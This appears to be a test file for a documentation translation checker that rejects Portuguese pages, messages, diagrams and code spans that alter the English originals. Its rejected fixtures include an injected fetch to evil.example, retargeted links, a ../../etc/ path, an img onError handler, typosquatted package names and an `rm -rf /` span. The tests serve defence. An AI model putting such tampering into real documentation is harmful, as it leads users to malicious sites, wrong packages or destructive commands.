import { describe, it, strict } from 'poku';
import { pageParity, textParity } from '../../../tools/i18n/parity.js';

const ENGLISH = `---
id: detect
title: '/lagune-detect: Map Your System'
sidebar_label: 2. Detect
description: Read your code and map what your system does.
---

import { Faq } from '@site/src/components/docs/Faq';
import TabItem from '@theme/TabItem';
import Tabs from '@theme/Tabs';

# /lagune-detect

Run it after the [charter](/docs/commands/charter), with \`npx lagune read catalog\` at hand.

<Tabs>
  <TabItem value="full" label="Whole project" default>

\`\`\`prompt
/lagune-detect make sure customer data in src/routes/ is never exposed
\`\`\`

  </TabItem>
</Tabs>

\`\`\`bash
npm i -D lagune@{{version}}
\`\`\`

:::tip[Get the most out of it]

Scope it to what changed.

:::

<Faq
  items={[
    {
      question: 'Does /lagune-detect change my code?',
      answer: 'No. Run npx lagune read catalog to see what it loads.',
    },
  ]}
/>
`;

const TRANSLATION = `---
id: detect
title: '/lagune-detect: mapeie seu sistema'
sidebar_label: 2. Detect
description: Lê o seu código e mapeia o que o sistema faz.
source_hash: '${'a'.repeat(64)}'
---

import { Faq } from '@site/src/components/docs/Faq';
import TabItem from '@theme/TabItem';
import Tabs from '@theme/Tabs';

# /lagune-detect

Rode depois do [charter](/docs/commands/charter), com \`npx lagune read catalog\` à mão.

<Tabs>
  <TabItem value="full" label="Projeto inteiro" default>

\`\`\`prompt
/lagune-detect garanta que os dados de clientes em src/routes/ nunca fiquem expostos
\`\`\`

  </TabItem>
</Tabs>

\`\`\`bash
npm i -D lagune@{{version}}
\`\`\`

:::tip[Aproveite ao máximo]

Limite ao que mudou.

:::

<Faq
  items={[
    {
      question: 'O /lagune-detect altera o meu código?',
      answer: 'Não. Rode npx lagune read catalog para ver o que ele carrega.',
    },
  ]}
/>
`;

const tamper = (from: string, to: string): string => {
  if (!TRANSLATION.includes(from))
    throw new Error(`The translation fixture holds no "${from}".`);

  return TRANSLATION.replace(from, to);
};

const hostilePages = [
  {
    name: 'changes the command of a prompt',
    page: tamper('/lagune-detect garanta', '/lagune-harden garanta'),
  },
  {
    name: 'changes the path of a prompt',
    page: tamper('em src/routes/ nunca', 'em ../../etc/ nunca'),
  },
  {
    name: 'changes a code block',
    page: tamper('npm i -D lagune@{{version}}', 'npm i -D lagunee@{{version}}'),
  },
  {
    name: 'changes a token',
    page: tamper('lagune@{{version}}', 'lagune@latest'),
  },
  {
    name: 'changes inline code',
    page: tamper('`npx lagune read catalog`', '`npx lagunee read catalog`'),
  },
  {
    name: 'changes a component id',
    page: tamper('value="full"', 'value="scoped"'),
  },
  {
    name: 'changes an import',
    page: tamper("from '@theme/Tabs'", "from '@site/src/evil'"),
  },
  {
    name: 'adds an export',
    page: tamper(
      "import Tabs from '@theme/Tabs';",
      "import Tabs from '@theme/Tabs';\nexport const leak = fetch('https://evil.example');"
    ),
  },
  {
    name: 'adds an expression',
    page: tamper('Limite ao que mudou.', "Limite ao que mudou. {fetch('/x')}"),
  },
  {
    name: 'adds a component',
    page: tamper(
      'Limite ao que mudou.',
      'Limite ao que mudou. <img src="x" onError={() => 1} />'
    ),
  },
  {
    name: 'adds a link',
    page: tamper(
      'Limite ao que mudou.',
      '[Limite](https://evil.example) ao que mudou.'
    ),
  },
  {
    name: 'adds a bare URL',
    page: tamper(
      'Limite ao que mudou.',
      'Limite ao que mudou em www.evil.example.'
    ),
  },
  {
    name: 'adds a link target to a component',
    page: tamper(
      'Limite ao que mudou.',
      '<a href="/docs/evil">Limite</a> ao que mudou.'
    ),
  },
  {
    name: 'retargets a link',
    page: tamper('(/docs/commands/charter)', '(https://evil.example/charter)'),
  },
  {
    name: 'adds a URL inside a component text',
    page: tamper('para ver o que ele carrega.', 'em https://evil.example.'),
  },
  {
    name: 'changes a command inside a component text',
    page: tamper(
      'Rode npx lagune read catalog',
      'Rode npx lagunee read catalog'
    ),
  },
  {
    name: 'changes a callout type',
    page: tamper(':::tip[', ':::danger['),
  },
  {
    name: 'changes the doc id',
    page: tamper('id: detect', 'id: harden'),
  },
  {
    name: 'adds a frontmatter key',
    page: tamper('sidebar_label:', 'slug: /evil\nsidebar_label:'),
  },
  {
    name: 'drops the command from its title',
    page: tamper("'/lagune-detect: mapeie", "'Detect: mapeie"),
  },
];

describe('the check of a translated page', () => {
  it('accepts a translation that keeps everything English keeps', () => {
    strict.deepStrictEqual(pageParity(ENGLISH, TRANSLATION), []);
  });

  for (const { name, page } of hostilePages)
    it(`rejects a translation that ${name}`, () => {
      strict(pageParity(ENGLISH, page).length > 0);
    });
});

const MESSAGE =
  'Run `{command} --categories` or npx skills add wellwelwel/lagune, then open /lagune-charter at https://lagune.ai/docs.';

const hostileMessages = [
  {
    name: 'drops a placeholder',
    message:
      'Rode `--categories` ou npx skills add wellwelwel/lagune e abra /lagune-charter em https://lagune.ai/docs.',
  },
  {
    name: 'changes a command',
    message:
      'Rode `{command} --categories` ou npx skills add wellwelwel/lagunee e abra /lagune-charter em https://lagune.ai/docs.',
  },
  {
    name: 'changes a slash command',
    message:
      'Rode `{command} --categories` ou npx skills add wellwelwel/lagune e abra /lagune-harden em https://lagune.ai/docs.',
  },
  {
    name: 'changes a URL',
    message:
      'Rode `{command} --categories` ou npx skills add wellwelwel/lagune e abra /lagune-charter em https://evil.example/docs.',
  },
  {
    name: 'adds a URL',
    message:
      'Rode `{command} --categories` ou npx skills add wellwelwel/lagune e abra /lagune-charter em https://lagune.ai/docs ou https://evil.example.',
  },
];

describe('the check of a translated message', () => {
  it('accepts a translation that keeps its commands, placeholders, and URLs', () => {
    strict.deepStrictEqual(
      textParity(
        MESSAGE,
        'Rode `{command} --categories` ou npx skills add wellwelwel/lagune e abra /lagune-charter em https://lagune.ai/docs.'
      ),
      []
    );
  });

  for (const { name, message } of hostileMessages)
    it(`rejects a translation that ${name}`, () => {
      strict(textParity(MESSAGE, message).length > 0);
    });
});

const faithfulProse = [
  {
    name: 'ends a command at the close of its sentence',
    english:
      'Any other agent installs it with npx skills add wellwelwel/lagune. The install page shows the command for each agent.',
    translated:
      'Qualquer outro agente o instala com npx skills add wellwelwel/lagune. A página de instalação mostra o comando de cada agente.',
  },
  {
    name: 'ends a command before the prose that follows it',
    english:
      'Run npx skills add wellwelwel/lagune in your project, or paste the install prompt into your agent.',
    translated:
      'Rode npx skills add wellwelwel/lagune no seu projeto ou cole o prompt de instalação no seu agente.',
  },
  {
    name: 'ends a command at a comma',
    english:
      'Run npx skills update, or paste the update prompt into your agent.',
    translated:
      'Rode npx skills update ou cole o prompt de atualização no seu agente.',
  },
  {
    name: 'ends a command after its flag when prose follows',
    english: 'Running npx lagune write add --categories changes them.',
    translated: 'Rodar npx lagune write add --categories as altera.',
  },
  {
    name: 'keeps the value of a flag inside the command',
    english:
      'For example, npx lagune write add --categories javascript. The charter records the rest.',
    translated:
      'Por exemplo, npx lagune write add --categories javascript. O charter registra o resto.',
  },
  {
    name: 'ends an install command before the prose that follows it',
    english:
      'Install the engine with npm i -D lagune@{{version}} from your own terminal.',
    translated:
      'Instale o engine com npm i -D lagune@{{version}} pelo seu próprio terminal.',
  },
  {
    name: 'ends an engine command where its grammar ends',
    english: 'Pull the move, then run npx lagune migrate once.',
    translated: 'Baixe a mudança e rode npx lagune migrate uma vez.',
  },
  {
    name: 'reads words around a placeholder as prose',
    english: 'Defense{lineBreak}by design',
    translated: 'Defesa{lineBreak}desde o projeto',
  },
  {
    name: 'reads a runner named in prose as prose',
    english: "The npx rule covers a command sent as a session's first message.",
    translated:
      'A regra do npx cobre um comando enviado como a primeira mensagem de uma sessão.',
  },
  {
    name: 'reads quotes as punctuation and slash-joined words as prose',
    english:
      'Hardens “sign in with Google/Microsoft/etc.” so an attacker has a harder time.',
    translated:
      'Reforça o "entrar com Google, Microsoft etc." para dificultar a vida de quem ataca.',
  },
];

const hostileProse = [
  {
    name: 'changes an engine command',
    english: 'Pull the move, then run npx lagune migrate once.',
    translated: 'Baixe a mudança e rode npx lagune migrar uma vez.',
  },
  {
    name: 'changes a subcommand',
    english:
      'Any other agent installs it with npx skills add wellwelwel/lagune. The install page shows it.',
    translated:
      'Qualquer outro agente o instala com npx skills adicionar wellwelwel/lagune. A página o mostra.',
  },
  {
    name: 'changes a flag',
    english: 'Running npx lagune write add --categories changes them.',
    translated: 'Rodar npx lagune write add --category as altera.',
  },
  {
    name: 'changes the value of a flag',
    english:
      'For example, npx lagune write add --categories javascript. The charter records the rest.',
    translated:
      'Por exemplo, npx lagune write add --categories python. O charter registra o resto.',
  },
  {
    name: 'changes the package of an install command',
    english:
      'Install the engine with npm i -D lagune@{{version}} from your own terminal.',
    translated:
      'Instale o engine com npm i -D lagunee@{{version}} pelo seu próprio terminal.',
  },
  {
    name: 'changes code inside quotes',
    english: 'Install “wellwelwel/lagune” from GitHub.',
    translated: 'Instale "wellwelwel/lagunee" pelo GitHub.',
  },
];

describe('the check of commands in translated prose', () => {
  for (const { name, english, translated } of faithfulProse)
    it(`accepts a translation where it ${name}`, () => {
      strict.deepStrictEqual(textParity(english, translated), []);
    });

  for (const { name, english, translated } of hostileProse)
    it(`rejects a translation that ${name}`, () => {
      strict(textParity(english, translated).length > 0);
    });
});

const diagramPage = (flowchart: string, states: string): string =>
  `---\nid: paper\ntitle: Paper\n---\n\n\`\`\`mermaid\n${flowchart}\n\`\`\`\n\n\`\`\`mermaid\n${states}\n\`\`\`\n`;

const ENGLISH_FLOWCHART = `flowchart TB
    charter["1 · charter (policy)<br/>reads: the project<br/>writes: the charter"]
    detect["2 · detect (detect)<br/>reads: the code"]
    q1{"Does the code do anything security-relevant?"}
    charter --> detect --> q1
    q1 -->|no| little["SDH adds little here."]
    detect -.->|"closure: stands it down<br/>across the chain"| charter
    tracking["{ paths: [&quot;src/routes/upload.ts&quot;] }"]`;

const ENGLISH_STATES = `stateDiagram-v2
    direction TB
    [*] --> OPEN: detect detects
    OPEN --> StoodDown: risk closed
    StoodDown --> SETTLED
    StoodDown: STOOD DOWN · one line in the history`;

const TRANSLATED_FLOWCHART = `flowchart TB
    charter["1 · charter (política)<br/>lê: o projeto<br/>escreve: o charter"]
    detect["2 · detect (detecção)<br/>lê: o código"]
    q1{"O código faz algo relevante para a segurança?"}
    charter --> detect --> q1
    q1 -->|não| little["O SDH acrescenta pouco aqui."]
    detect -.->|"encerramento: encerra o achado<br/>em toda a cadeia"| charter
    tracking["{ paths: [&quot;src/routes/upload.ts&quot;] }"]`;

const TRANSLATED_STATES = `stateDiagram-v2
    direction TB
    [*] --> OPEN: o detect detecta
    OPEN --> StoodDown: risco encerrado
    StoodDown --> SETTLED
    StoodDown: ENCERRADO · uma linha no histórico`;

const ENGLISH_DIAGRAMS = diagramPage(ENGLISH_FLOWCHART, ENGLISH_STATES);

const swapDiagram = (
  diagram: 'flowchart' | 'states',
  from: string,
  to: string
): string => {
  const source =
    diagram === 'flowchart' ? TRANSLATED_FLOWCHART : TRANSLATED_STATES;

  if (!source.includes(from))
    throw new Error(`The translated ${diagram} fixture holds no "${from}".`);

  const changed = source.replace(from, to);

  return diagram === 'flowchart'
    ? diagramPage(changed, TRANSLATED_STATES)
    : diagramPage(TRANSLATED_FLOWCHART, changed);
};

const hostileDiagrams = [
  {
    name: 'renames a node id',
    page: swapDiagram('flowchart', 'detect["2', 'scan["2'),
  },
  {
    name: 'changes an arrow',
    page: swapDiagram('flowchart', 'detect -.->|', 'detect -->|'),
  },
  {
    name: 'retargets an edge',
    page: swapDiagram('flowchart', 'cadeia"| charter', 'cadeia"| q1'),
  },
  {
    name: 'changes the direction',
    page: swapDiagram('flowchart', 'flowchart TB', 'flowchart LR'),
  },
  {
    name: 'drops a line break from a label',
    page: swapDiagram('flowchart', '(política)<br/>lê', '(política) lê'),
  },
  {
    name: 'changes a path inside a label',
    page: swapDiagram(
      'flowchart',
      'src/routes/upload.ts',
      'src/routes/evil.ts'
    ),
  },
  {
    name: 'renames a state id',
    page: swapDiagram('states', 'OPEN --> StoodDown', 'ABERTO --> StoodDown'),
  },
  {
    name: 'adds a transition',
    page: swapDiagram(
      'states',
      'StoodDown --> SETTLED',
      'StoodDown --> SETTLED\n    SETTLED --> OPEN'
    ),
  },
];

describe('the check of a translated diagram', () => {
  it('accepts a diagram that translates only its labels', () => {
    strict.deepStrictEqual(
      pageParity(
        ENGLISH_DIAGRAMS,
        diagramPage(TRANSLATED_FLOWCHART, TRANSLATED_STATES).replace(
          '---\n\n',
          `source_hash: '${'a'.repeat(64)}'\n---\n\n`
        )
      ),
      []
    );
  });

  for (const { name, page } of hostileDiagrams)
    it(`rejects a diagram that ${name}`, () => {
      strict(pageParity(ENGLISH_DIAGRAMS, page).length > 0);
    });
});

const markdownPage = (block: string): string =>
  `---\nid: prompts\ntitle: Prompts\n---\n\n\`\`\`\`md\n${block}\n\`\`\`\`\n`;

const ENGLISH_MARKDOWN = `/lagune You are a researcher using Lagune.

Run \`npx --yes skills add wellwelwel/lagune\` and read https://lagune.ai/docs first.

\`\`\`prompt
/lagune-detect <path>
\`\`\`

## Loop

Merge every report into <file>.`;

const TRANSLATED_MARKDOWN = `/lagune Você é um pesquisador que usa o Lagune.

Rode \`npx --yes skills add wellwelwel/lagune\` e leia https://lagune.ai/docs primeiro.

\`\`\`prompt
/lagune-detect <path>
\`\`\`

## Repetição

Junte cada relatório em <file>.`;

const ENGLISH_MARKDOWN_PAGE = markdownPage(ENGLISH_MARKDOWN);

const swapMarkdown = (from: string, to: string): string => {
  if (!TRANSLATED_MARKDOWN.includes(from))
    throw new Error(`The translated md fixture holds no "${from}".`);

  return markdownPage(TRANSLATED_MARKDOWN.replace(from, to));
};

const hostileMarkdown = [
  {
    name: 'changes its command',
    page: swapMarkdown('/lagune Você', '/lagune-harden Você'),
  },
  {
    name: 'changes its inline code',
    page: swapMarkdown('skills add wellwelwel', 'skills adicionar wellwelwel'),
  },
  {
    name: 'changes its URL',
    page: swapMarkdown('https://lagune.ai/docs', 'https://evil.example/docs'),
  },
  {
    name: 'changes a placeholder',
    page: swapMarkdown('em <file>', 'em <arquivo>'),
  },
  {
    name: 'changes the command of a nested prompt',
    page: swapMarkdown('/lagune-detect <path>', '/lagune-harden <path>'),
  },
  {
    name: 'adds a path',
    page: swapMarkdown('primeiro.', 'primeiro, salvando em src/evil/.'),
  },
];

describe('the check of a translated md block', () => {
  it('accepts a block that translates only its prose', () => {
    strict.deepStrictEqual(
      pageParity(
        ENGLISH_MARKDOWN_PAGE,
        markdownPage(TRANSLATED_MARKDOWN).replace(
          '---\n\n',
          `source_hash: '${'a'.repeat(64)}'\n---\n\n`
        )
      ),
      []
    );
  });

  for (const { name, page } of hostileMarkdown)
    it(`rejects a block that ${name}`, () => {
      strict(pageParity(ENGLISH_MARKDOWN_PAGE, page).length > 0);
    });
});

const inlinePage = (body: string): string =>
  `---\nid: charter\ntitle: Charter\n---\n\n${body}\n`;

const ENGLISH_INLINE = inlinePage(
  'Ask `"Where does the data live?"` or `"Can npx lagune help here?"`, then check `hash("md5", …)` and `Cipher.getInstance("DES"/…/ECB")`.'
);

const translatedInline = (spans: string[]): string =>
  inlinePage(
    `Pergunte ${spans.map((span) => `\`${span}\``).join(', ')}.`
  ).replace('---\n\n', `source_hash: '${'a'.repeat(64)}'\n---\n\n`);

const FAITHFUL_SPANS = [
  '"Onde ficam os dados?"',
  '"O npx lagune pode ajudar aqui?"',
  'hash("md5", …)',
  'Cipher.getInstance("DES"/…/ECB")',
];

const hostileInline = [
  {
    name: 'disguises a code span as prose',
    spans: [
      FAITHFUL_SPANS[0],
      FAITHFUL_SPANS[1],
      '"hash de md5 qualquer"',
      FAITHFUL_SPANS[3],
    ],
  },
  {
    name: 'swaps a code span with a phrase',
    spans: [
      FAITHFUL_SPANS[2],
      FAITHFUL_SPANS[1],
      FAITHFUL_SPANS[0],
      FAITHFUL_SPANS[3],
    ],
  },
  {
    name: 'turns a phrase into code',
    spans: [
      '"rm -rf /"',
      FAITHFUL_SPANS[1],
      FAITHFUL_SPANS[2],
      FAITHFUL_SPANS[3],
    ],
  },
  {
    name: 'changes a command inside a phrase',
    spans: [
      FAITHFUL_SPANS[0],
      '"O npx lagunee pode ajudar aqui?"',
      FAITHFUL_SPANS[2],
      FAITHFUL_SPANS[3],
    ],
  },
  {
    name: 'drops a span',
    spans: [FAITHFUL_SPANS[0], FAITHFUL_SPANS[1], FAITHFUL_SPANS[2]],
  },
];

describe('the check of inline code that holds a phrase', () => {
  it('accepts a translated phrase beside code kept as in English', () => {
    strict.deepStrictEqual(
      pageParity(ENGLISH_INLINE, translatedInline(FAITHFUL_SPANS)),
      []
    );
  });

  it('accepts a phrase in a script written without spaces between words', () => {
    strict.deepStrictEqual(
      pageParity(
        ENGLISH_INLINE,
        translatedInline([
          '"数据存放在哪里？"',
          '"npx lagune 能在这里帮上忙吗？"',
          FAITHFUL_SPANS[2],
          FAITHFUL_SPANS[3],
        ])
      ),
      []
    );
  });

  it('accepts a phrase whose words end in vowel signs', () => {
    strict.deepStrictEqual(
      pageParity(
        ENGLISH_INLINE,
        translatedInline([
          '"डेटा कहाँ रखा है?"',
          FAITHFUL_SPANS[1],
          FAITHFUL_SPANS[2],
          FAITHFUL_SPANS[3],
        ])
      ),
      []
    );
  });

  for (const { name, spans } of hostileInline)
    it(`rejects a translation that ${name}`, () => {
      strict(pageParity(ENGLISH_INLINE, translatedInline(spans)).length > 0);
    });
});
